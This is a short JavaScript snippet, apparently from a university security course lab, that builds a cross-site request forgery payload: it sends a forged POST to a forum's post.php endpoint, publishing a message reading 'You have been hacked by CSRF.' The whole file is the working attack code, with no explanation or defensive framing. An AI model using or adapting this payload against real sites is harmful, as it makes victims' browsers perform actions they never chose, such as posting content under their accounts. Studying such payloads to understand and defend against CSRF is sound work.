var http = new XMLHttpRequest();
var url = "http://forest.cs.purdue.edu/cs526/post.php";
var params = "title=Hacked&message=You+have+been+hacked+by+CSRF.&post_submit=POST";
http.open("POST", url, true);

//Send the proper header information along with the request
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.setRequestHeader("Content-length", params.length);
http.setRequestHeader("Connection", "close");
http.send(params);